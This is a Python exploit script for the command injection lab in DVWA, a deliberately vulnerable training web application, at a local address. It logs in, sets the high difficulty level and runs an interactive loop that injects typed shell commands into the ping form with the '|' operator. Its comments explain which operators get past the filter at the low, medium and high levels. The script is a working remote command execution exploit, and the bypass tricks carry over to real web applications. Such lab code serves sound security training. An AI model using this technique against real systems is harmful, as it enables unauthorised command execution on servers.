"""
    Command injection in DVWA
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

"""
In this level we can inject a command doing another command after the ip
For low level there is no filter on operators so you can use ';' or any other operator :
    exploit(sess, ';', command=<command>)
For medium level it filters the ';' and the '&&' but you can still use either the '&' or the '|' operator :
    exploit(sess, '&', command=<command>)
For the high level it filters all the operaters but for the '|' operator it filters only "| " meaning that if we send it without space it works :
    exploit(sess, '|', command=<command>)
"""
def exploit(sess, operator=';', no_ip_scan=True, command="echo 'Pwned!'", select_output_only=True):
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/exec/")
    #print(resp.text)

    if no_ip_scan:
        exploit = "127.0.0.1 > /dev/null"
    else:
        exploit = "127.0.0.1"
      
    exploit += operator+command

    payload = {
        "Submit":"Submit",
        "ip":exploit
    }
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/exec/", data=payload)
    if select_output_only:
        soup = BeautifulSoup(resp.text, 'lxml')
        output = soup.find_all('pre')
        print(output)
    else:
        print(resp.text)



def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    #print(sess.get("http://192.168.1.73/dvwa/").text)
    
    while True:
        command_to_send = input("> ")
        exploit(sess, '|', command= command_to_send)
    
main()